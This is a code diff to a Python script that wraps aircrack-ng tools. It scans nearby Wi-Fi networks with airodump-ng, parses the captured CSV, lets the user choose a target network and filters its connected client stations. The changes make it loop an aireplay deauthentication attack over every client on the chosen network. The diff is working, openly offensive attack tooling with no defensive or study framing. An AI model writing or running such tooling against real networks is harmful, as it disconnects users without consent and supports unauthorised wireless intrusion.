@@ -33,9 +33,9 @@ class aircrack:
         subprocess.call(cmd, shell=True)
 
     def airodump_call():
-        cmd = 'sudo airodump-ng --write txt wlan0mon'
+        cmd = 'sudo airodump-ng --write a/txt01 wlan0mon'
         result = subprocess.Popen(cmd,shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE)
-        time.sleep(5)
+        time.sleep(20)
         result.kill()
 
     def sort_by_power(arr):
@@ -45,7 +45,7 @@ class aircrack:
         return arr[10]
 
     def open_csv_file():
-        filename = 'txt-01.csv'
+        filename = 'a/txt01-01.csv'
         with open(filename, 'r', newline = '') as file:
             file_reader = csv.reader(file)
             format_file = [row for row in file_reader]
@@ -62,16 +62,21 @@ class aircrack:
                 break
             network_mas.append(a)
         network_mas.sort(key = aircrack.sort_by_data,reverse = True)
-        current_net = network_mas[0]
-        resut = airodumpNet(current_net[0],
-                        current_net[3],
-                        current_net[5],
-                        current_net[8],
-                        current_net[9],
-                        current_net[10],
-                        current_net[13])
-        print(resut)
-        return resut
+
+        result_array = []
+
+        for current_net in network_mas:
+            result = airodumpNet(current_net[0],
+                            current_net[3],
+                            current_net[5],
+                            current_net[8],
+                            current_net[9],
+                            current_net[10],
+                            current_net[13])
+            result_array.append(result)
+
+        print(result_array)
+        return result_array
 
     def search_station():
         format_file = aircrack.open_csv_file()
@@ -90,17 +95,41 @@ class aircrack:
             a = airodumpStation(station[0],
                                 station[3],
                                 station[4],
-                                station[5])
+                                station[5][1:])
             network_station_mas.append(a)
         print(network_station_mas)
         return network_station_mas
 
+    def choose_network():
+        net = aircrack.search_network()
+        print(net)
+        index = 0
+        for network in net:
+            print("%s: %s" % (index, network.EESID))
+            index = index + 1
+        select_network = int(input("Select network"))
+        return net[select_network]
+
+    def filter_station(network: airodumpNet, station_array: [airodumpStation]):
+        result_array = []
+        for station in station_array:
+            print("a",station.BSSID)
+            print("a",network.BSSID)
+            if station.BSSID == network.BSSID:
+                result_array.append(station)
+        print("RESULT", result_array)
+        return result_array
+
     def aireplay_attack():
         ap = aireplay()
-        net = aircrack.search_network()
-        station = aircrack.search_station()
-        print(net,station[0])
-        ap.deauth_attack(net, station[0])
+        select_network = aircrack.choose_network()
+        station_array = aircrack.search_station()
+        select_station_array = aircrack.filter_station(select_network, station_array)
+        if len(select_station_array) > 0:
+            for station in select_station_array:
+                ap.deauth_attack(select_network, station)
+        else:
+            print("0 station in network")
 
 class aireplay:
 
@@ -109,8 +138,8 @@ class aireplay:
         print(cmd)
         self.change_channel(net)
         result = subprocess.Popen(cmd,shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE)
-        out, err = result.communicate()
-        print(out)
+        #out, err = result.communicate()
+        #print(out)
         time.sleep(15)
         result.kill()
 
